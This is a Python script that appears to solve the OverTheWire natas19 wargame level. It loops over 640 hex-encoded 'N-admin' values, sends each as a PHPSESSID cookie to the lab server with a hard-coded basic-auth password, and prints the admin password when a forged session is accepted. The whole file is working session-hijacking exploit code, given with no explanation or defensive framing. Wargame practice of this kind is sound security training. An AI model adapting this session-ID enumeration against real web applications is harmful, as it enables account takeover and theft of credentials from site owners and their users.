import requests
import re

target = 'http://natas19.natas.labs.overthewire.org/index.php?debug=1'
user_auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

#payload = {"user":""}

for i in range(1,641):
    encodedStr = (str(i) + "-admin").encode("hex")

    #session = requests.Session()

    #response = requests.get(target, auth = user_auth)
    response = requests.get(target, auth = user_auth, 
        cookies = {"PHPSESSID":encodedStr})
    result = re.search('Password:.+</pre>', response.text)
    #print result
    if result == None:
        print("PHPSESSID: " + str(i) + " " + encodedStr + " unsuccessful"),
        #print response.text
        match = re.search('DEBUG.+<br>', response.text)
        print(match.group(0)),
        match = re.search('password', response.text)
        print(match)
    else:
        print "success!"
        print result.group(0)
	print response.text
        break
    
        

#print response.text
